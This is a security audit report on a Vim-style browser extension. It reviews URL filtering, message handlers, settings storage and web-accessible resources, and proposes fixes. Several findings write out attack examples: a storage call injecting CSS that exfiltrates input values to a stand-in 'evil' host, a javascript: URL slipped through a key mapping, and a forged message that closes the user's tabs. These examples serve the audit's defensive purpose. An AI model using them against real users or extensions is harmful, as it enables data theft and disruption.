# audit-bg: background scripts, manifest, lib/settings, lib/url_utils, lib/utils

Scope: read-only review. Repo HEAD 1c110ad0.

Ground truth used for every finding:
- No `externally_connectable` in manifest and no `onMessageExternal`/`onConnect` listener, so web pages and other extensions cannot message the background. The only senders are this extension's own content scripts and extension pages (options, popup, HUD/help iframes).
- So a normal malicious page can only reach the background *through* our content scripts, driven by trusted user keys acting on page-controlled data (clipboard, link hrefs, selected text). Several findings below need a **compromised renderer** (a renderer exploit lets page code act as our content script). Those are marked "renderer-compromise" and rated lower.

## 1. Findings

### F1. Low: toNavigableUrl allows any scheme except javascript/data/vbscript (file://, chrome://, chrome-extension://, custom app protocols)
- File: lib/url_utils.js:92-108, 117-120; background_scripts/tab_operations.js:11-15
- What: `convertToUrl` returns any string that starts with `about:`, `view-source:`, `extension:`, `chrome-extension:` unchanged (`hasChromeProtocol`). It also returns any `scheme://...` unchanged (`urlHasProtocol`). The only block is the javascript/data/vbscript denylist. The background then opens the URL with `chrome.tabs.create/update` or `windows.create`. An extension is allowed to open things a web page cannot open itself.
- Paths where the page controls the text (each needs a trusted key from the user):
  - `p` / `P` open the clipboard (content_scripts/mode_normal.js:183-199). A page can set the clipboard in a copy event.
  - Visual mode: open the yanked selection (content_scripts/mode_visual.js:470-473).
  - Link hints, open-in-incognito: uses `link.href` (content_scripts/link_hints.js:112). This command is not mapped by default.
- What the attacker gets:
  - Opens `file:///...`. A web page cannot link to `file:` itself. It can only display a local file; the page cannot read it.
  - Opens `chrome-extension://<this-ext-id>/pages/reload.html`. That page reloads the extension (background_scripts/reload.js:6), which orphans content scripts in open tabs, so this is a nuisance DoS. Every page can learn the extension ID from the HUD iframe `src` in our open shadow root (content_scripts/ui_component.js:75).
  - Opens `chrome://` pages, other extensions' pages, and `scheme://` external-protocol handlers (vscode://, zoommtg://, slack:// ...). The OS-handler prompt still applies.
  - Not reachable: chrome://quit, chrome://kill and similar. Chrome blocks extensions from opening these debug URLs.
- Scenario: a site sets the clipboard to `file:///Users/<name>/Library/...` or to `chrome-extension://<id>/pages/reload.html` on copy. The user presses `P` later. The tab opens and the extension reloads.
- Fix: switch to an allowlist in `toNavigableUrl`. Allow http, https, and `about:newtab`/`about:blank`. Allow `view-source:` only when followed by http(s), which `toggleViewSource` needs. Anything else becomes a search, or null. Also delete pages/reload.html and background_scripts/reload.js from the shipped tree; they are dev-only.

### F2. Low: createTab in a new window or incognito skips toNavigableUrl
- File: background_scripts/main.js:239-247 (compare 249-258)
- What: in the `window`/`incognito` branch, `request.urls` goes straight to `chrome.windows.create({url: urls})`. The new-tab branch filters each URL through `TabOperations.openUrlInNewTab` → `toNavigableUrl`; the window branch does not. The URLs come from:
  - (a) keyMappings options. `isUrl` accepts any `x://` string, so `map X createTab javascript://%0aalert(1) window` gets through.
  - (b) the `newTabCustomUrl` setting.
  - (c) `request.url`/`request.urls` in the message. No in-repo sender sets these, so this source needs a renderer compromise.
- Scenario: the user imports a crafted settings backup (or a compromised renderer writes storage.local, see F4) with `newTabCustomUrl` = `javascript://%0a...` and a mapping `createTab window`. The filtered path would block this URL; this path does not. MV3 Chrome probably refuses javascript: in windows.create (not verified here), so impact is uncertain. The filter is still bypassed for every other scheme from F1.
- Fix: map `request.urls` through `toNavigableUrl` and drop nulls before `windows.create`. Also ignore `request.url`/`request.urls` from messages: build URLs only from the background's own registry and settings.

### F3. Low: search URL output not re-checked; settings values not type-checked
- File: background_scripts/tab_operations.js:14; lib/url_utils.js:123-133; lib/settings.js:100-102, 128-131
- What: `toNavigableUrl` checks only the input text. The output of `createSearchUrl(text, Settings.get("searchUrl"))` is never checked. If `searchUrl` is `javascript:...%s` or `data:text/html,...%S`, any non-URL clipboard text or selection is placed into it and opened. `%S` inserts the text raw, without encoding. Import keeps only known keys, but values are never type-checked. Bad values also break things:
  - `exclusionRules` that is not an array, or a rule without `passKeys`, throws in exclusions.js:37/45/58. Then initializeFrame never answers and the extension goes dead on every page.
- Scenario: a malicious "Vimium config" backup sets searchUrl to a data:/javascript: URL. Every `p` on non-URL text then opens attacker HTML. Needs social engineering, or F4.
- Fix: run `isBlockedUrl`, or better the F1 allowlist, on the final URL. On load and import, validate setting types: string, boolean, array of {pattern: string, passKeys: string}. Reject a searchUrl that is not http(s).

### F4. Low (renderer-compromise): content scripts can write extension storage that controls every site
- File: background_scripts/main.js:21 (session TRUSTED_AND_UNTRUSTED), main.js:455-467 and 769-773 (user CSS injected into every frame), lib/settings.js:100 (settings read from storage.local, which content scripts can always read and write)
- What: one compromised renderer, on any site, can rewrite storage.local settings and storage.session state:
  - `userDefinedLinkHintCss`, `searchUrl`, `keyMappings`, `exclusionRules`
  - `normalModeKeyStateMapping`, `vimiumSecret`
  The background injects `userDefinedLinkHintCss` into **every frame of every site** on each commit (onCommitted). So a compromise of one site's process becomes CSS injection into all other origins. Examples: CSS attribute-selector exfiltration of tokens or input values via `background:url(https://attacker/?...)` on work sites without a strict CSP, or visual spoofing. This breaks site isolation's goal. (The CSS injection feature itself is accepted; the new part here is the write path from untrusted contexts.)
- Scenario: a renderer bug on ad-heavy site A runs `chrome.storage.local.set({userDefinedLinkHintCss: "input[value^=a]{background:url(//evil/a)}..."})`. Every page the user opens afterwards leaks matching values to evil.
- Fix: if `chrome.storage.local.setAccessLevel({accessLevel:"TRUSTED_CONTEXTS"})` is supported on the target Chrome version (verify; the API exists on StorageArea), call it. Then have content scripts get settings and local marks through a background message. The background validates them, and the CSS check can strip `url(`/`@import`. Minimum: strip `url(`, `image-set(`, `@import` from the CSS before `insertCSS`.

### F5. Low (renderer-compromise): background trusts message fields it could derive itself
- File: background_scripts/main.js:566-619
- Covers all handlers registered at main.js:682. Specific cases:
  - `runBackgroundCommand` (567-569) runs `BackgroundCommands[request.registryEntry.command]` using the registryEntry and options from the message. It does not look up the user's real mapping, and there is no `hasOwnProperty` check. This allows createTab with arbitrary URLs (F2), `closeOtherTabs`, `toggleMuteTab all`, `moveTabToNewWindow`, `restoreTab`, etc. without a key press.
  - `selectSpecificTab` (604) focuses any tab ID. **No in-repo caller left** (it was the omnibar's). Dead attack surface.
  - `sendMessageToFrames` (609-613) and `broadcastLinkHintsMessage` (481-486, 614) relay any object from any frame, including cross-origin iframes, to all frames in the tab. One example: the iframe content script can send `runInTopFrame` with any registryEntry to the top frame.
  - `getCurrentTabUrl` (572-574) returns the top-level tab URL to any frame, including cross-origin iframes. Our content script does not put it in page DOM, so this only matters after a compromise.
- Scenario: a compromised ad iframe renderer sends `{handler:"runBackgroundCommand", registryEntry:{command:"closeOtherTabs",options:{}}}` and the user loses all tabs. With `createTab`+`window` it can open arbitrary schemes (F2).
- Fix:
  - Remove `selectSpecificTab` from `sendRequestHandlers`.
  - In runBackgroundCommand, accept only a key or command name. Look up the registryEntry in `Commands.keyToRegistryEntry`, check `background: true` and `Object.hasOwn(BackgroundCommands, cmd)`, and ignore the message-supplied `urls`/`url`/`options`.
  - In `sendMessageToFrames`, allow only the handlers it is actually used for: `runInTopFrame`, `focusFrame`, `linkHintsMessage`.

### F6. Info: extension ID and resources exposed to every page (fingerprinting)
- File: manifest.json:106-121
- What: `pages/command_listing.html` and `resources/tlds.txt` are web-accessible to `<all_urls>`, but nothing loads them in page context:
  - command_listing is only linked from the options page.
  - tlds.txt is fetched only by the background and extension pages.
  Any site can probe `chrome-extension://<id>/resources/tlds.txt` to detect this unique fork, which identifies the user across sites. The ID is already visible through the HUD iframe src, so the main gain is less surface (also no clickjacking of command_listing).
- Fix: remove those two entries from web_accessible_resources. Optionally set `"use_dynamic_url": true` on the remaining entries. Test HUD/help first, because content scripts must then use the dynamic URL.

### F7. Info: clipboard text goes to Google when it is not a URL
- File: background_scripts/tab_operations.js:14; lib/settings.js:52
- What: `p`/`P`/visual-open send any non-URL text to `https://www.google.com/search?q=`. A page can plant the clipboard text. Worse, if the clipboard still holds something the user copied earlier (a password or token), pressing `p` by mistake sends it to Google. This is the only network egress path in my files, and it needs a key press.
- Fix (optional): if the text is not a URL, show a HUD message instead of searching, or ask first.

### F8. Info: global marks store full URLs (with query strings) on disk
- File: background_scripts/marks.js:17-43
- What: `url: getBaseUrl(sender.tab.url)` strips only `#...`. Query-string tokens such as `?token=` or `?sig=` persist in chrome.storage.local in the profile on disk, and any content script can read them. Also a crash: if `markInfo` is missing (mark never set), `goto` (line 54) throws a TypeError. In `create`, the `response` at line 34 can be undefined (no top-frame reply), which also throws a TypeError.
- Fix: optionally strip the query string, or note this to the owner. Null-check `markInfo` and `response`.

### F9. Info: bugs found while tracing (not security)
- main.js:87 `audibleUnmutedTabs.length >= 0` is always true, so `toggleMuteTab all/other` never unmutes.
- main.js:28-30 generates a new `vimiumSecret` on every service-worker wake, not once per browser session. So global marks often treat the stored tabId as stale. Security is unaffected: the UI handshake reads the current value.
- main.js:777-780 + 817, commands.js:294: `Commands.init` runs on module load and again on onStartup/onInstalled, which adds duplicate Settings "change" listeners.
- lib/utils.js:73 `escapeHtml` escapes only `<`/`>`, not `&` or quotes. It is **unused**; delete it so nobody trusts it later.
- lib/dom_utils.js:386 `simulateClickDefaultAction` is never called. It contains an unfiltered-by-design `target=_blank` path that would send page hrefs to openUrlInNewTab; delete it.
- exclusions.js:16 runs user exclusion patterns as regexes (with `*` → `.*`) against every URL. A badly written pattern can be catastrophically slow (ReDoS). The patterns are the user's own, so this is low risk.

## 2. Coverage (all read in full, line by line)

| File | Lines | Status |
|---|---|---|
| manifest.json | 121 | read in full |
| background_scripts/main.js | 817 | read in full |
| background_scripts/commands.js | 491 | read in full |
| background_scripts/all_commands.js | 576 | read in full |
| background_scripts/marks.js | 129 | read in full |
| background_scripts/tab_recency.js | 129 | read in full |
| background_scripts/tab_operations.js | 68 | read in full |
| background_scripts/exclusions.js | 69 | read in full |
| background_scripts/reload.js | 27 | read in full |
| background_scripts/bg_utils.js | 19 | read in full |
| lib/settings.js | 166 | read in full |
| lib/url_utils.js | 136 | read in full |
| lib/utils.js | 417 | read in full |

Read only the parts needed to confirm call paths: content_scripts/mode_normal.js (40-70, 140-205), lib/dom_utils.js (330-420), pages/ui_component_messenger.js (full), content_scripts/ui_component.js (55-100, 180-200), content_scripts/link_hints.js (170-300, 490-520), pages/reload.html.

## 3. Notable things that are safe, and why
- No `externally_connectable` and no `onMessageExternal`/`onConnect` listener: web pages and other extensions cannot message the background.
- No eval, `Function`, string setTimeout, or dynamic import in my files. `Utils.setTimeout` always receives functions.
- Network: the only `fetch` calls are on `chrome.runtime.getURL(...)` (main.js:61, url_utils.js:29). No other egress apart from F7, and CSP `connect-src 'self'` on extension pages.
- No innerHTML, insertAdjacentHTML, or document.write in my files.
- `toNavigableUrl` denylist: `^\s*(javascript|data|vbscript):/i`. Tested evasions:
  - Leading control chars, and tab/newline inside the scheme (`java\nscript:`), fail `isUrl` and become a search.
  - `java\nscript:x@host.com` gets an `http://` prefix.
  - `view-source:javascript:` does not run script.
- openUrlInCurrentTab/NewTab: `tabId`/`tab` are overwritten from `sender.tab` (main.js:699-702), so a frame cannot target another tab with them.
- UI iframe handshake: the secret is posted with targetOrigin `chrome-extension://<id>/` (ui_component.js:87), and the iframe checks `event.source === parent` plus the secret (ui_component_messenger.js:9-14). A page that swaps the iframe src cannot receive the secret.
- Remote frames' hint descriptors (incl. linkText) stay in content-script memory. Only local hints become DOM markers (link_hints.js:490-503), so a cross-origin iframe page cannot read the top frame's link text.
- Settings import drops unknown keys (settings.js:130). Marks use the `vimiumGlobalMark|` prefix, so they cannot collide with settings keys.
- `forTrusted` checks `event.isTrusted` (utils.js:3-12), so synthetic page events are ignored where it is used.
- `secretToken` comes from 32 bytes of crypto.getRandomValues. The hex has no zero padding, but that still leaves well over 128 bits.
- KeyMappingsParser: `__proto__` cannot be a named key (regex `[a-z][a-z0-9]+`). Option names are allowlisted per command. Input is the user's own config.
- Permissions: no clipboardRead/Write, downloads, cookies, or webRequest. `scripting` is used only to inject the extension's own files and the user's CSS.
